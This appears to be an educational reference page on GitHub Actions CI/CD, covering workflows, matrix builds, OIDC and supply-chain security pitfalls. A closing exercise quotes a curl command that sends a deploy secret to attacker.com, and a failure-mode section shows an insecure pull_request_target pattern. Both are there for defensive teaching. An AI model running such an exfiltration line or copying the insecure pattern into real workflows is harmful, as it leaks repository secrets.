---
layout: default
title: "GitHub Actions"
parent: "CI/CD"
nav_order: 1000
permalink: /ci-cd/github-actions/
number: "1000"
category: CI/CD
difficulty: ★★☆
depends_on: Continuous Integration, Pipeline as Code, Git Basics
used_by: Continuous Delivery, Continuous Deployment, SAST
related: Jenkins, GitLab CI, CircleCI
tags:
  - cicd
  - devops
  - git
  - intermediate
  - bestpractice
---

# 1000 — GitHub Actions

⚡ TL;DR — GitHub Actions is GitHub's native CI/CD platform that runs YAML-defined workflows triggered by repository events, with zero server management and a marketplace of 20,000+ reusable actions.

| #1000 | Category: CI/CD | Difficulty: ★★☆ |
|:---|:---|:---|
| **Depends on:** | Continuous Integration, Pipeline as Code, Git Basics | |
| **Used by:** | Continuous Delivery, Continuous Deployment, SAST | |
| **Related:** | Jenkins, GitLab CI, CircleCI | |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
Every team using GitHub for source control still needs a separate CI/CD system. They set up Jenkins, configure webhooks from GitHub to Jenkins, manage Jenkins controllers and agents, maintain plugin versions, and handle authentication between Jenkins and GitHub (tokens, SSH keys). When the GitHub → Jenkins webhook breaks or the Jenkins server goes down, CI stops. New developers must learn two systems: GitHub for code and Jenkins for CI.

**THE BREAKING POINT:**
The friction between the code host (GitHub) and the CI system creates operational overhead, authentication complexity, and a context-switching tax. Every team invents a slightly different integration. The CI configuration lives in a UI (Jenkins) rather than the repository, making it invisible to code review.

**THE INVENTION MOMENT:**
This is exactly why GitHub Actions was created: eliminate the gap between where code lives (GitHub) and where it's verified (CI) — making CI a first-class feature of the repository itself, triggered by any repository event, configured in YAML alongside the code.

---

### 📘 Textbook Definition

**GitHub Actions** is GitHub's integrated CI/CD and automation platform. Workflows are defined in YAML files stored under `.github/workflows/` in the repository. Workflows are triggered by GitHub events (push, pull_request, release, schedule, workflow_dispatch, etc.). Each workflow contains jobs, which run on GitHub-hosted runners (Ubuntu, Windows, macOS) or self-hosted runners. Jobs contain steps — individual shell commands or reusable actions from the GitHub Marketplace. Actions are versioned, shareable automation units (Docker containers or JavaScript). Concurrency controls, secrets management, and environment protection rules are built into the platform.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Write YAML in your repo, and GitHub automatically runs it whenever your code changes.

**One analogy:**
> GitHub Actions is like having a butler inside your filing cabinet. Whenever you add, move, or change a document (push, PR), the butler automatically follows the instructions you left in the cabinet (workflow YAML) — notifying the right people, making copies, running checks. No external service needed; the butler is part of the cabinet.

**One insight:**
The key architectural difference from Jenkins: GitHub Actions is **event-driven**. Any GitHub event — not just code pushes — can trigger a workflow. PRs opened, issues created, releases published, a schedule, a manual button click, another workflow completing. This makes it a general-purpose automation platform, not just a CI system.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**
1. Workflows are triggered by repository events — they're reactive, not scheduled primarily.
2. Jobs run in isolated, ephemeral environments — each job starts fresh.
3. Steps share a workspace — within a job, each step sees the outputs of previous steps.
4. Secrets are injected by the platform — never stored in YAML.

**DERIVED DESIGN:**
The YAML-in-repo model means workflow changes go through PR review — the CI configuration is as auditable as the code it builds. The isolated job model prevents state leakage between concurrent builds. The action model (`uses: actions/checkout@v4`) enables code reuse across repos — one team publishes an action, thousands use it.

Job dependencies (`needs:`) create a DAG (directed acyclic graph) of execution. Independent jobs run in parallel; dependent jobs wait. This achieves maximum wall-clock parallelism with minimal configuration.

**THE TRADE-OFFS:**
**Gain:** Zero operations, native GitHub integration, YAML-in-repo, vast action marketplace, free for public repos.
**Cost:** Per-minute billing on private repos (can become expensive at high build volumes). Limited custom execution environments vs Jenkins. GitHub dependency — if GitHub is down, CI is down. 6-hour job timeout limit.

---

### 🧪 Thought Experiment

**SETUP:**
Two teams implement the same CI pipeline (build, test, security scan) — Team A using GitHub Actions, Team B using Jenkins.

**TEAM B (Jenkins):**
Week 1: Set up Jenkins server. Install 8 plugins. Configure GitHub webhook. Week 2: Write Jenkinsfile. Coordinate with ops to open firewall ports. Configure Jenkins credentials. Week 4: A Jenkins plugin breaks. The ops team spends 4 hours rolling back. Month 3: Jenkins disk full — builds queue for 6 hours before an engineer notices.

**TEAM A (GitHub Actions):**
Day 1: Create `.github/workflows/ci.yml`. Write 30 lines of YAML. Push to repo. CI is running. Week 2: Add security scanning by adding 3 lines to YAML (`uses: github/codeql-action/analyze@v3`). Month 3: Zero operational incidents. Cost: $45/month in runner minutes.

**THE INSIGHT:**
GitHub Actions trades control and potential cost savings at large scale for dramatic simplicity and speed-to-productivity. For most teams, this tradeoff is correct — the operational cost of Jenkins exceeds the billing cost of Actions.

---

### 🧠 Mental Model / Analogy

> GitHub Actions workflows are like event-triggered IFTTT (If This Then That) recipes, but for software delivery. "IF a PR is opened THEN: run tests, check style, add a label. IF tests pass AND PR is merged THEN: build Docker image, push to registry, deploy to staging." The recipe card (YAML) lives in the drawer (repo) that the trigger affects.

- "IFTTT recipe" → workflow YAML file
- "Trigger condition 'IF'" → `on:` event definition
- "Action steps 'THEN'" → `steps:` in each job
- "Shared ingredients" → secrets and environment variables
- "Reusable recipe component" → action from the marketplace (`uses:`)

Where this analogy breaks down: IFTTT scripts are simple conditional; GitHub Actions supports full DAG job dependencies, matrix strategies, and conditional execution — significantly more complex than a single IF→THEN chain.

---

### 📶 Gradual Depth — Four Levels

**Level 1 — What it is (anyone can understand):**
GitHub Actions runs your tests automatically whenever you push code. You write a simple text file (YAML) telling it what to do — like "run these commands." GitHub reads this file and runs it on a computer it provides. You don't have to set anything up beyond writing that file.

**Level 2 — How to use it (junior developer):**
Create `.github/workflows/ci.yml`. Define `on: [push, pull_request]` to trigger on code changes. Add jobs with steps. Use `actions/checkout@v4` to check out your code. Use `actions/setup-java@v4` to configure Java. Run `mvn test`. Use `secrets.MY_SECRET` to reference secrets configured in the repo settings. Use the Actions tab in GitHub to see running workflows and their logs.

**Level 3 — How it works (mid-level engineer):**
A workflow YAML is parsed by GitHub's Actions runtime. On trigger, jobs are dispatched to available runners. GitHub-hosted runners are ephemeral VMs provisioned fresh for each job (Ubuntu 22.04 for `ubuntu-latest`, Windows Server 2022, macOS 14). Each step has its own process; environment variables and files in `$GITHUB_WORKSPACE` persist across steps. `actions/cache@v4` persists directories between runs using content-addressable storage keyed on a cache key expression. `GITHUB_OUTPUT` and `GITHUB_ENV` files allow steps to pass values to subsequent steps. OIDC tokens enable keyless authentication to cloud providers (AWS, GCP) without storing long-lived credentials.

**Level 4 — Why it was designed this way (senior/staff):**
GitHub Actions was designed to solve the "CI as a first-class API" problem. Every aspect of the platform exposes a REST API: trigger workflows programmatically, download artifacts, read job results. This makes GitHub Actions a workflow orchestration engine, not just a CI system. The action composability model (`uses:` referencing tagged releases) was designed to prevent the `latest` anti-pattern and enable auditable third-party automation. OIDC integration (2022) was a significant security advancement — replacing long-lived IAM keys with short-lived tokens that expire with the job, eliminating entire classes of credential leakage incidents.

---

### ⚙️ How It Works (Mechanism)

```
┌─────────────────────────────────────────────┐
│     GITHUB ACTIONS EXECUTION MODEL          │
├─────────────────────────────────────────────┤
│  TRIGGER: push to main branch               │
│  → GitHub reads .github/workflows/ci.yml    │
│  → Workflow parsed: 3 jobs found            │
│                                             │
│  JOB GRAPH:                                 │
│  build ──────────────────────┐              │
│  unit-test (needs: build) ───┤→ deploy      │
│  lint (independent) ─────────┘              │
│                                             │
│  EXECUTION:                                 │
│  1. Provision runner VM (ubuntu-latest)     │
│  2. Download actions from GitHub/Marketplace│
│  3. Run steps sequentially in workspace     │
│  4. Upload/download artifacts between jobs  │
│  5. Post results to PR/commit               │
│  6. Deprovision runner VM (ephemeral)       │
└─────────────────────────────────────────────┘
```

**Job dependency DAG:**
```yaml
jobs:
  build:          # no needs: → runs immediately
    ...
  unit-test:
    needs: build  # waits for build to pass
    ...
  lint:           # no needs: → runs in parallel with build
    ...
  deploy:
    needs: [unit-test, lint]  # waits for BOTH
    ...
```

**Matrix strategy for parallel test execution:**
```yaml
unit-test:
  strategy:
    matrix:
      java: [17, 21]          # run on Java 17 and 21
      os: [ubuntu, windows]   # run on both OS
  runs-on: ${{ matrix.os }}-latest
  steps:
    - uses: actions/setup-java@v4
      with:
        java-version: ${{ matrix.java }}
    - run: mvn test
```
This creates 4 parallel jobs (2 Java × 2 OS), all running simultaneously.

---

### 🔄 The Complete Picture — End-to-End Flow

**NORMAL FLOW:**
```
Developer pushes PR
  → GitHub Actions triggered on: pull_request
  → Jobs dispatched to GitHub runners
  → parallel: lint (30s) + build (2m)
  → unit-test (needs: build) → 3m [← YOU ARE HERE]
  → integration-test (needs: build) → 7m
  → All jobs GREEN
  → PR: all checks ✓
  → Code reviewed → merged
  → CD workflow triggered on: push (main)
  → Deploy to staging → Deploy to prod
```

**FAILURE PATH:**
```
unit-test fails: NullPointerException in UserService
  → Job marked FAILED
  → deploy job: skipped (needs: unit-test not satisfied)
  → PR: ✗ unit-test failed
  → GitHub shows exact test class + line number
  → Developer fixes → pushes → workflow reruns
```

**WHAT CHANGES AT SCALE:**
At thousands of builds per month, runner costs become significant. Teams implement: (1) self-hosted runners on existing infrastructure to avoid per-minute billing; (2) build caching strategies to cut build times (billing is by minute); (3) concurrency limits to prevent overspending on parallel jobs; (4) required review rules on workflow changes to prevent privileged action abuse.

---

### 💻 Code Example

**Example 1 — Complete CI/CD workflow:**
```yaml
# .github/workflows/ci-cd.yml
name: CI/CD

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          cache: maven

      - run: mvn --batch-mode verify

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: test-results
          path: target/surefire-reports/

  build-push:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write  # push to GHCR

    steps:
      - uses: actions/checkout@v4

      - uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - uses: docker/metadata-action@v5
        id: meta
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha
            type=semver,pattern={{version}}

      - uses: docker/build-push-action@v5
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build-push
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to staging
        run: |
          echo "Deploy image: ${{ needs.build-push.outputs.tags }}"
          # kubectl apply or helm upgrade here
```

**Example 2 — OIDC keyless AWS authentication (no stored keys):**
```yaml
jobs:
  deploy:
    permissions:
      id-token: write  # required for OIDC
      contents: read

    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          # No access key — uses OIDC token exchange
          role-to-assume: arn:aws:iam::123456789:role/GitHubDeployRole
          aws-region: us-east-1
          # Token expires when the job ends — no long-lived key
```

**Example 3 — Reusable workflow (DRY pipelines):**
```yaml
# .github/workflows/reusable-test.yml
on:
  workflow_call:    # can be called from other workflows
    inputs:
      java-version:
        type: string
        default: '21'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          java-version: ${{ inputs.java-version }}
      - run: mvn test

# In calling workflow:
# jobs:
#   call-test:
#     uses: ./.github/workflows/reusable-test.yml
#     with:
#       java-version: '21'
```

---

### ⚖️ Comparison Table

| Feature | GitHub Actions | Jenkins | GitLab CI | CircleCI |
|---|---|---|---|---|
| Hosting | GitHub-hosted | Self-hosted | Self/GitLab-hosted | Cloud-hosted |
| Config format | YAML | Groovy DSL | YAML | YAML |
| Operations | None | High | Low–Medium | None |
| Flexibility | High | Very High | High | Medium |
| Cost model | Per-minute | Infrastructure | Per-minute (cloud) | Per-minute |
| Best For | GitHub repos | Air-gapped, complex | GitLab repos | Speed-focused |

How to choose: Use GitHub Actions for all GitHub-hosted repositories — it's integrated, zero-ops, and sufficient for almost all use cases. Switch to Jenkins only for air-gapped environments or pipelines requiring complex orchestration beyond YAML DSL. Use GitLab CI for GitLab-hosted repositories.

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| `uses: actions/checkout@main` is safe | Using mutable branch refs (main) means the action can change underneath you. Always pin to a SHA: `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` |
| Free minutes mean no cost | GitHub Actions provides free minutes only for public repos and limited monthly minutes for private repos. Runners over the limit incur per-minute charges |
| The `GITHUB_TOKEN` has minimal permissions | By default, `GITHUB_TOKEN` has read-write access to the repository. Scope it down with `permissions:` in every workflow to principle of least privilege |
| Self-hosted runners are more secure | Self-hosted runners run arbitrary code from the internet (actions, dependencies). They can be more dangerous than GitHub-hosted runners if public repos can trigger workflows on them |
| Workflow secrets are always encrypted | Secrets are masked in logs, but a malicious step could exfiltrate them via network calls. OIDC (short-lived tokens) is safer than long-lived secrets |

---

### 🚨 Failure Modes & Diagnosis

**1. Supply Chain Attack via Compromised Actions**

**Symptom:** A third-party action in your workflow is updated to exfiltrate secrets. All workflows using `uses: vendor/action@v1` run the malicious code.

**Root Cause:** Using mutable version tags (`@v1`) instead of immutable commit SHAs. The action author (or attacker who compromised their account) pushes malicious code under the existing tag.

**Diagnostic:**
```bash
# Find all workflow files using mutable action refs
grep -r "uses:" .github/workflows/ \
  | grep -v "@[0-9a-f]\{40\}"
# Any result here is a mutable (unsafe) reference
```

**Fix:** Pin all third-party actions to full commit SHA:
```yaml
# BAD: mutable tag
- uses: actions/checkout@v4

# GOOD: immutable SHA pin
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
  # v4.2.2 tagged on this commit
```

**Prevention:** Use Dependabot to automatically update pinned SHAs. Use `step-security/harden-runner` to detect suspicious network calls from action steps.

---

**2. Secret Leakage Via PR from Fork**

**Symptom:** Public repo allows PRs from forks. CI workflow on fork PRs can access secrets. An attacker submits a PR that modifies the workflow to exfiltrate secrets.

**Root Cause:** Workflows triggered by `pull_request` from forks do NOT have access to secrets (this is the safe default). But `pull_request_target` does — and is often misconfigured.

**Diagnostic:**
```bash
# Check for dangerous trigger combination
grep -l "pull_request_target" .github/workflows/*.yml \
  | xargs grep -l "secrets\."
# Any match = potential secret leakage from fork PRs
```

**Fix:**
```yaml
# BAD: pull_request_target + secrets + checkout of PR code
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          # This checks out untrusted fork code with secrets!

# GOOD: separate trusted/untrusted workflows
# Use pull_request (no secrets) for fork PR builds
# Use push (with secrets) for trusted branch builds
```

**Prevention:** Never combine `pull_request_target` with checking out PR code and having access to production secrets.

---

**3. Runaway Parallel Jobs Spike Costs**

**Symptom:** GitHub billing alert: $3,000 charge in one day. A matrix workflow or a recursive workflow_dispatch loop consumed 50,000 runner minutes.

**Root Cause:** Matrix strategy with many dimensions created hundreds of parallel jobs. Or a workflow triggered another workflow in a loop.

**Diagnostic:**
```bash
# GitHub API: list workflow runs with cost data
gh run list --workflow=ci.yml \
  --json databaseId,conclusion,billableAt \
  | jq '.[] | select(.billableAt > 60)'
```

**Fix:** Add concurrency limits to workflows:
```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true  # cancel old run when new one starts

# Limit matrix size explicitly
strategy:
  max-parallel: 4  # never run >4 jobs at once
  matrix:
    ...
```

**Prevention:** Set GitHub spending limits (Actions → Billing settings). Always add `concurrency:` to workflows triggered on every push.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**
- `Continuous Integration` — GitHub Actions is the implementation; CI is the practice it enables
- `Pipeline as Code` — GitHub Actions workflows are Pipeline as Code stored in the repository
- `Git Basics` — understanding push, branch, PR events is required to configure workflow triggers

**Builds On This (learn these next):**
- `Continuous Delivery` — GitHub Actions CD workflows deploy artifacts through environment stages
- `SAST (Static Analysis)` — commonly implemented in GitHub Actions via CodeQL, Snyk, or Semgrep actions
- `GitOps` — GitHub Actions can trigger ArgoCD or Flux deployments as part of a GitOps CD implementation

**Alternatives / Comparisons:**
- `Jenkins` — self-hosted alternative with more flexibility but significantly higher operational cost
- `GitLab CI` — equivalent platform for GitLab-hosted repositories with similar YAML pipeline model
- `CircleCI` — hosted CI with strong Docker support and fast build times for cloud teams

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ WHAT IT IS   │ GitHub-native CI/CD: YAML workflows       │
│              │ triggered by repository events            │
├──────────────┼───────────────────────────────────────────┤
│ PROBLEM IT   │ Separate CI server management and         │
│ SOLVES       │ GitHub-CI integration complexity          │
├──────────────┼───────────────────────────────────────────┤
│ KEY INSIGHT  │ Pin all third-party actions to full       │
│              │ SHA — mutable tags are a security risk    │
├──────────────┼───────────────────────────────────────────┤
│ USE WHEN     │ Your source code is on GitHub — zero-ops  │
│              │ CI/CD with full event integration         │
├──────────────┼───────────────────────────────────────────┤
│ AVOID WHEN   │ Air-gapped environment, or extremely      │
│              │ high build volume making billing > Jenkins│
├──────────────┼───────────────────────────────────────────┤
│ TRADE-OFF    │ Zero ops + native integration vs          │
│              │ per-minute billing + GitHub dependency    │
├──────────────┼───────────────────────────────────────────┤
│ ONE-LINER    │ "Your Jenkinsfile and Jenkins server,     │
│              │  replaced by YAML in your repo"           │
├──────────────┼───────────────────────────────────────────┤
│ NEXT EXPLORE │ GitLab CI → Tekton → ArgoCD → GitOps     │
└──────────────────────────────────────────────────────────┘
```

---

### 🧠 Think About This Before We Continue

**Q1.** Your open-source project on GitHub uses GitHub Actions for CI. A contributor submits a PR that modifies `.github/workflows/ci.yml` to add `curl https://attacker.com/steal?token=${{ secrets.DEPLOY_KEY }}`. Trace exactly: will this exfiltrate the `DEPLOY_KEY` secret? What GitHub protections exist, which ones prevent this, and which specific conditions would make the repository vulnerable to this attack despite the protections?

**Q2.** A team currently runs 500 GitHub Actions workflow minutes per day on private repos. Their GitHub Teams plan gives 3,000 free minutes/month with overages at $0.008/minute. In Month 6, a new feature doubles their test run time and adds a matrix strategy that triples parallel jobs. Calculate the projected cost and design a technical strategy to reduce workflow minutes by 40% without reducing test coverage or deployment frequency.

